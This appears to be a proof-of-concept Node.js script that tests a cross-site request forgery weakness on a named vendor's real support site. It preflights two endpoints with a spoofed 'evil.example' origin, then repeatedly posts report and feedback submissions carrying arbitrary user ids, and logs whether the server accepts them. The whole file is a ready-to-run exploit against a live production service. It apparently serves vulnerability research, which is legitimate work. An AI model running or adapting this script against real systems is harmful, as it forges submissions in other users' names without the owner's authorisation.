// 35 - Cross-site support writes via CORS (report/feedback CSRF).
//
// A malicious page can submit reports and feedback with arbitrary userId
// because the CORS preflight reflects its origin and the endpoints have no
// CSRF token. No victim uuid is needed.
//
// Run: node run.js

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const { fetch } = require('undici');

const BASE = process.env.BAMBU_BASE || 'https://support.bambulab.com';
const EVIL = process.env.EVIL_ORIGIN || 'https://evil.example';
const TRIALS = parseInt(process.env.TRIALS || '3', 10);
const UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function preflight(endpoint) {
  const r = await fetch(BASE + endpoint, {
    method: 'OPTIONS',
    headers: {
      origin: EVIL,
      'access-control-request-method': 'POST',
      'access-control-request-headers': 'content-type',
      'user-agent': UA,
    },
    signal: AbortSignal.timeout(15000),
  });
  return {
    status: r.status,
    allowOrigin: r.headers.get('access-control-allow-origin'),
    allowCredentials: r.headers.get('access-control-allow-credentials'),
    allowMethods: r.headers.get('access-control-allow-methods'),
    allowHeaders: r.headers.get('access-control-allow-headers'),
  };
}

async function post(endpoint, body) {
  try {
    const r = await fetch(BASE + endpoint, {
      method: 'POST',
      headers: {
        origin: EVIL,
        'content-type': 'application/json',
        'user-agent': UA,
        'x-bbl-official-site-region': 'EN',
      },
      body: JSON.stringify(body),
      signal: AbortSignal.timeout(15000),
    });
    return { status: r.status, text: (await r.text()).slice(0, 220) };
  } catch (e) {
    return { status: 'ERR', text: e.name + ': ' + e.message };
  }
}

function reportBody(marker) {
  return {
    userId: marker,
    sessionId: crypto.randomUUID(),
    requestId: 'clientID_text_' + crypto.randomUUID(),
    reportReason: 1,
    reportDetail: `CSRF report ${marker}`,
    messageContent: `CSRF message ${marker}`,
    extendField4: marker,
    origin: 1,
  };
}

function feedbackBody(marker) {
  return {
    userId: marker,
    feedbackClass: 1,
    feedbackType: 1,
    feedback: `CSRF feedback ${marker}`,
    knowledgeId: '0',
    sessionId: crypto.randomUUID(),
    origin: 1,
    requestId: 'clientID_text_' + crypto.randomUUID(),
    extendField4: marker,
  };
}

(async () => {
  const results = {
    base: BASE,
    timestamp: new Date().toISOString(),
    hypothesis:
      'A malicious origin can submit report/feedback writes with arbitrary userId because CORS reflects its origin and no CSRF token is required.',
    preflight: {},
    report: [],
    feedback: [],
  };

  results.preflight.report = await preflight('/gw/robot/front/report');
  results.preflight.feedback = await preflight('/gw/robot/front/feedback');
  console.log('PREFLIGHT report', JSON.stringify(results.preflight.report));
  console.log('PREFLIGHT feedback', JSON.stringify(results.preflight.feedback));

  for (let i = 1; i <= TRIALS; i++) {
    const m = 'CSRF-' + crypto.randomUUID().slice(0, 6).toUpperCase();
    const r = await post('/gw/robot/front/report', reportBody(m));
    const row = { trial: i, marker: m, status: r.status, dataTrue: /"data":true/.test(r.text), response: r.text.replace(/\s+/g, ' ') };
    results.report.push(row);
    console.log(`REPORT ${i} status=${r.status} dataTrue=${row.dataTrue}`);
    await sleep(500);
  }

  for (let i = 1; i <= TRIALS; i++) {
    const m = 'CSRF-' + crypto.randomUUID().slice(0, 6).toUpperCase();
    const r = await post('/gw/robot/front/feedback', feedbackBody(m));
    const row = { trial: i, marker: m, status: r.status, dataTrue: /"data":true/.test(r.text), response: r.text.replace(/\s+/g, ' ') };
    results.feedback.push(row);
    console.log(`FEEDBACK ${i} status=${r.status} dataTrue=${row.dataTrue}`);
    await sleep(500);
  }

  results.summary = {
    report: results.report.filter((r) => r.dataTrue).length + '/' + TRIALS,
    feedback: results.feedback.filter((r) => r.dataTrue).length + '/' + TRIALS,
    victimUuidRequired: false,
  };
  console.log('SUMMARY', JSON.stringify(results.summary));
  fs.writeFileSync(path.join(__dirname, 'results.json'), JSON.stringify(results, null, 2));
  fs.writeFileSync(
    path.join(__dirname, 'results.txt'),
    [
      'PREFLIGHT report ' + JSON.stringify(results.preflight.report),
      'PREFLIGHT feedback ' + JSON.stringify(results.preflight.feedback),
      ...results.report.map((r) => `REPORT ${r.trial} status=${r.status} dataTrue=${r.dataTrue} marker=${r.marker}`),
      ...results.feedback.map((r) => `FEEDBACK ${r.trial} status=${r.status} dataTrue=${r.dataTrue} marker=${r.marker}`),
      'SUMMARY ' + JSON.stringify(results.summary),
    ].join('\n') + '\n'
  );
  process.exit(0);
})();
